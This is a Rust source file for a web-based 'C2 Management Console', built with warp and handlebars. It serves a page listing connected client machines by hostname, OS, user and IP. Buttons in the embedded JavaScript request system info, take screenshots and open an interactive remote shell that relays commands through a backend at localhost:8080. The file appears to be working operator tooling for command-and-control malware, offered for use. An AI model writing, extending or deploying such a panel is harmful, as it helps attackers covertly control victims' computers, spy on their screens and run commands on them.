use warp::{Filter, Reply, Rejection};
use handlebars::Handlebars;
use serde_json::json;
use std::sync::Arc;
use log::{info, error};

use c2_common::ClientInfo;

#[derive(Clone)]
struct AppState {
    templates: Arc<Handlebars<'static>>,
    api_url: String,
}

async fn index(state: Arc<AppState>) -> Result<impl Reply, Rejection> {
    let clients = fetch_clients(&state.api_url).await.unwrap_or_default();
    
    let data = json!({
        "title": "C2 Management Console",
        "clients": clients,
        "total_clients": clients.len()
    });
    
    let rendered = state.templates.render("index", &data)
        .map_err(|e| {
            error!(target: "web", "Template rendering error: {:?}", e);
            warp::reject::not_found()
        })?;
    
    Ok(warp::reply::html(rendered))
}

async fn fetch_clients(api_url: &str) -> Result<Vec<ClientInfo>, reqwest::Error> {
    let client = reqwest::Client::new();
    let url = format!("http://{}/clients", api_url);
    
    client.get(&url)
        .send()
        .await?
        .json::<Vec<ClientInfo>>()
        .await
}


async fn health_check() -> Result<impl Reply, Rejection> {
    Ok(warp::reply::json(&json!({ "status": "ok" })))
}

fn register_templates() -> Handlebars<'static> {
    let mut handlebars = Handlebars::new();
    
    let index_template = r#"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{title}}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }
        .client-list { margin-top: 20px; }
        .client-card { 
            border: 1px solid #ddd; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 5px;
            background: #f9f9f9;
        }
        .status { 
            display: inline-block; 
            width: 10px; 
            height: 10px; 
            border-radius: 50%; 
            background: green; 
            margin-right: 10px;
        }
        
        .terminal {
            border: 1px solid #ccc;
            border-radius: 5px;
            padding: 10px;
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        
        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            color: white;
        }
        
        .terminal-output {
            height: 200px;
            overflow-y: auto;
            margin-bottom: 10px;
            padding: 5px;
            background: #111;
            border-radius: 3px;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
        }
        
        .terminal-input input {
            flex: 1;
            padding: 5px;
            border: 1px solid #333;
            border-radius: 3px;
            background: #222;
            color: #00ff00;
        }
        
        .terminal-input button {
            padding: 5px 10px;
            border: 1px solid #333;
            border-radius: 3px;
            background: #333;
            color: white;
            cursor: pointer;
        }
        
        .terminal-input button:hover {
            background: #555;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>{{title}}</h1>
        <p>Total connected clients: {{total_clients}}</p>
    </div>
    
    <div class="client-list">
        {{#each clients}}
        <div class="client-card">
            <h3><span class="status"></span>{{hostname}} ({{os}})</h3>
            <p><strong>ID:</strong> {{id}}</p>
            <p><strong>User:</strong> {{user}}</p>
            <p><strong>IP:</strong> {{ip}}</p>
            <p><strong>Last seen:</strong> {{last_seen}}</p>
        </div>
        {{/each}}
        
        {{#unless clients}}
        <div class="client-card">
            <h3>No clients connected</h3>
            <p>Waiting for client connections...</p>
        </div>
        {{/unless}}
    </div>
    
    <script>
        function refreshClients() {
            fetch('http://localhost:8080/clients')
                .then(response => response.json())
                .then(clients => {
                    console.log('Clients updated:', clients);
                    updateClientList(clients);
                })
                .catch(error => console.error('Error fetching clients:', error));
        }
        
        function updateClientList(clients) {
            const clientList = document.querySelector('.client-list');
            const totalClientsEl = document.querySelector('.header p');
            
            // Update total clients count
            if (totalClientsEl) {
                totalClientsEl.textContent = 'Total connected clients: ' + clients.length;
            }
            
            // Clear existing list
            clientList.innerHTML = '';
            
            if (clients.length === 0) {
                clientList.innerHTML = `
                    <div class="client-card">
                        <h3>No clients connected</h3>
                        <p>Waiting for client connections...</p>
                    </div>
                `;
                return;
            }
            
            // Add each client to the list
            clients.forEach(client => {
                const clientCard = document.createElement('div');
                clientCard.className = 'client-card';
                clientCard.innerHTML = `
                    <h3><span class="status"></span>${escapeHtml(client.hostname)} (${escapeHtml(client.os)})</h3>
                    <p><strong>ID:</strong> ${escapeHtml(client.id)}</p>
                    <p><strong>User:</strong> ${escapeHtml(client.user)}</p>
                    <p><strong>IP:</strong> ${escapeHtml(client.ip)}</p>
                    <p><strong>Last seen:</strong> ${new Date(client.last_seen * 1000).toLocaleString()}</p>
                    <div class="client-actions">
                        <button onclick="sendCommand('${escapeHtml(client.id)}', 'system_info')">System Info</button>
                        <button onclick="sendCommand('${escapeHtml(client.id)}', 'screenshot')">Screenshot</button>
                        <button onclick="openShellTerminal('${escapeHtml(client.id)}')">Open Shell</button>
                    </div>
                    <div id="terminal-${escapeHtml(client.id)}" class="terminal" style="display: none; margin-top: 10px;">
                        <div class="terminal-header">
                            <h4>Shell Terminal - ${escapeHtml(client.hostname)}</h4>
                            <button type="button" onclick="closeShellTerminal('${escapeHtml(client.id)}')">Close</button>
                        </div>
                        <div id="output-${escapeHtml(client.id)}" class="terminal-output"></div>
                        <div class="terminal-input">
                            <input type="text" id="input-${escapeHtml(client.id)}" placeholder="Enter command..." onkeypress="handleTerminalInput(event, '${escapeHtml(client.id)}')">
                            <button type="button" onclick="executeShellCommand('${escapeHtml(client.id)}')">Execute</button>
                        </div>
                    </div>
                `;
                clientList.appendChild(clientCard);
            });
        }
        
        function escapeHtml(unsafe) {
            if (typeof unsafe !== 'string') return unsafe;
            return unsafe
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
        
        function sendCommand(clientId, commandType) {
            fetch(`http://localhost:8080/command/${clientId}/${commandType}`, { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    console.log('Command sent:', data);
                    
                    // Poll for results based on command type
                    if (commandType === 'system_info') {
                        pollSystemInfo(clientId);
                    } else if (commandType === 'screenshot') {
                        pollScreenshot(clientId);
                    } else if (commandType === 'shell') {
                        pollCommandOutput(clientId);
                    }
                })
                .catch(error => {
                    console.error('Error sending command:', error);
                    alert('Error sending command');
                });
        }
        
        function pollSystemInfo(clientId) {
            fetch(`http://localhost:8080/systeminfo/${clientId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert(`System Info: ${data.system_info}`);
                    } else {
                        // Keep polling if not ready yet
                        setTimeout(() => pollSystemInfo(clientId), 1000);
                    }
                })
                .catch(error => console.error('Error polling system info:', error));
        }
        
        function pollScreenshot(clientId) {
            fetch(`http://localhost:8080/screenshot/${clientId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert(`Screenshot available: ${data.message}`);
                        // You can display the screenshot using data.screenshot (base64)
                    } else {
                        // Keep polling if not ready yet
                        setTimeout(() => pollScreenshot(clientId), 1000);
                    }
                })
                .catch(error => console.error('Error polling screenshot:', error));
        }
        
        function pollCommandOutput(clientId) {
            fetch(`http://localhost:8080/output/${clientId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert(`Command Output: ${data.output}`);
                    } else {
                        // Keep polling if not ready yet
                        setTimeout(() => pollCommandOutput(clientId), 1000);
                    }
                })
                .catch(error => console.error('Error polling command output:', error));
        }
        
        function openShellTerminal(clientId) {
            const terminal = document.getElementById(`terminal-${clientId}`);
            terminal.style.display = 'block';
            appendToTerminal(clientId, 'Shell terminal opened. Type commands below.');
        }
        
        function closeShellTerminal(clientId) {
            const terminal = document.getElementById(`terminal-${clientId}`);
            terminal.style.display = 'none';
        }
        
        function handleTerminalInput(event, clientId) {
            if (event.key === 'Enter') {
                executeShellCommand(clientId);
            }
        }
        
        function executeShellCommand(clientId) {
            const input = document.getElementById(`input-${clientId}`);
            const command = input.value.trim();
            
            if (!command) return;
            
            appendToTerminal(clientId, `$ ${command}`);
            input.value = '';
            
            // Parse command and arguments
            const parts = command.split(' ');
            const cmd = parts[0];
            const args = parts.slice(1);
            
            fetch(`http://localhost:8080/shell/${clientId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    command: cmd,
                    args: args
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    // Poll for command output
                    pollShellOutput(clientId);
                } else {
                    appendToTerminal(clientId, `Error: ${data.message}`);
                }
            })
            .catch(error => {
                appendToTerminal(clientId, `Error: ${error.message}`);
            });
        }
        
        function pollShellOutput(clientId) {
            fetch(`http://localhost:8080/output/${clientId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        appendToTerminal(clientId, data.output);
                    } else {
                        // Keep polling if not ready yet
                        setTimeout(() => pollShellOutput(clientId), 500);
                    }
                })
                .catch(error => {
                    appendToTerminal(clientId, `Error polling output: ${error.message}`);
                });
        }
        
        function appendToTerminal(clientId, text) {
            const output = document.getElementById(`output-${clientId}`);
            output.innerHTML += `<div>${escapeHtml(text)}</div>`;
            output.scrollTop = output.scrollHeight;
        }
        
        // Refresh every 5 seconds for better responsiveness
        setInterval(refreshClients, 5000);
        
        // Initial load
        refreshClients();
    </script>
</body>
</html>
"#;
    
    handlebars.register_template_string("index", index_template)
        .expect("Failed to register template");
    
    handlebars
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    
    let templates = Arc::new(register_templates());
    let api_url = "localhost:8080".to_string();
    
    let state = Arc::new(AppState { templates, api_url });
    
    let index_state = state.clone();
    let index_route = warp::path::end()
        .and(warp::get())
        .and(warp::any().map(move || index_state.clone()))
        .and_then(index);
    
    let health_route = warp::path("health")
        .and(warp::get())
        .and_then(health_check);
    
    let clients_state = state.clone();
    let clients_route = warp::path("clients")
        .and(warp::get())
        .and(warp::any().map(move || clients_state.clone()))
        .and_then(|state: Arc<AppState>| async move {
            match fetch_clients(&state.api_url).await {
                Ok(clients) => Ok(warp::reply::json(&clients)),
                Err(e) => {
                    error!(target: "web", "Failed to fetch clients: {:?}", e);
                    Err(warp::reject::not_found())
                }
            }
        });
    
    let routes = index_route
        .or(health_route)
        .or(clients_route)
        .with(warp::cors().allow_any_origin())
        .with(warp::log("web"));
    
    let addr: std::net::SocketAddr = "127.0.0.1:3000".parse()?;
    
    info!(target: "web", "Starting web interface on {}", addr);
    
    warp::serve(routes).run(addr).await;
    
    Ok(())
}